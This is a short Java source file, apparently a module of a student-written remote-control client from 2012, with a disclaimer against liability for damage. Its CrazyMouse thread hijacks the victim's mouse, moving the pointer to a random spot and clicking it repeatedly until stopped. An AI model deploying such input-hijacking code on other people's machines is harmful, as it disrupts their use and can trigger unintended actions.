/* Este software ha sido realizado por Andoni Diaz Puerta */
/* con finalidad educativa y sin ánimo de lucro.          */
/* Ni yo ni nadie se hace responsable del daño que puedas */
/* causar con este código.                                */
/*  andoni.diaz@estudiants.urv.cat - ETSE URV - 2012      */                   

package debci.cliente;

import java.awt.AWTException;
import java.awt.Robot;
import java.awt.event.InputEvent;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author Debci
 */
public class CrazyMouse extends Thread {
    private static Robot robot;
    private static int contador=500;
    private static boolean continuar=true;
    float x,y;
    public void run(){
        x = (float) (Math.random() * 1000);
        y = (float) (Math.random() * 1000);
        try {
            Robot controlador = new Robot();
            while(continuar){
                controlador.mouseMove((int)x, (int)y);
            for(int i = 0; i< 5;i++){
                    controlador.mousePress(InputEvent.BUTTON1_MASK);
                    controlador.mouseRelease(InputEvent.BUTTON1_MASK);
            }
        try {
                    Thread.sleep(30);
        } catch (InterruptedException ex) {
        }
            }
        } catch (AWTException ex) {
            
        }
    }
    public void pararLocura(){
        continuar = false;
    }
}
